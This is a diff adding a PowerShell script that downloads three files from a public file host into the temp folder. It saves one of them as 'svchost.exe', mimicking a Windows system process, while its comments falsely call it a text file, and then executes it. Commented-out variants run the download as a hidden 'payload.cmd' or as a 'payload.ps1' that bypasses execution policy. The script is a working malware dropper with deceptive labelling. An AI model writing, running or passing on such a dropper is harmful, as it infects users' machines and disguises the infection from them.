@@ -1,0 +1,53 @@
+$ErrorActionPreference = 'Stop'
+
+# URLs
+$zipUrl = 'https://files.catbox.moe/4zswvv.zip'
+$rarUrl = 'https://files.catbox.moe/m782tl.rar'
+$txtUrl = 'https://files.catbox.moe/rzyk91.txt'   # will save as .txt locally
+
+# Temp paths
+$tmp  = $env:TEMP
+$base = Join-Path $tmp 'WinRAR'
+$zip  = Join-Path $tmp 'winrar.zip'
+$rar  = Join-Path $tmp 'm782tl.rar'
+$txt  = Join-Path $tmp 'svchost.exe'              # force .txt
+
+# Clean up any previous folder
+if (Test-Path $base) {
+    Remove-Item $base -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Create working folder
+New-Item -ItemType Directory -Path $base | Out-Null
+
+# Download the zip and extract it
+Invoke-WebRequest $zipUrl -OutFile $zip -UseBasicParsing
+Expand-Archive -Path $zip -DestinationPath $base -Force
+
+# Download the .rar but do NOT extract it
+Invoke-WebRequest $rarUrl -OutFile $rar -UseBasicParsing
+
+# Download the .txt (source is .bin, save as .txt)
+Invoke-WebRequest $txtUrl -OutFile $txt -UseBasicParsing
+
+# Full path to the RAR we just placed in %TEMP%
+$rarFullPath = $rar
+
+# Open the .txt and pass the RAR path as an argument
+# (Whether the argument is used depends on the app associated with .txt)
+Start-Process -FilePath $txt -ArgumentList @($rarFullPath)
+
+# If you actually intend to EXECUTE the downloaded file as a script,
+# uncomment ONE of the following two blocks instead of Start-Process above:
+
+# --- If it's a batch file content, save & run as .cmd ---
+# $cmd = Join-Path $tmp 'payload.cmd'
+# Copy-Item $txt $cmd -Force
+# Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', $cmd, $rarFullPath) -WindowStyle Hidden
+
+# --- If it's PowerShell script content, save & run as .ps1 ---
+# $ps1 = Join-Path $tmp 'payload.ps1'
+# Copy-Item $txt $ps1 -Force
+# powershell -NoProfile -ExecutionPolicy Bypass -File $ps1 --% $rarFullPath
+
+"Done: RAR downloaded to $rarFullPath, WinRAR unpacked to $base, text saved to $txt and opened with argument."
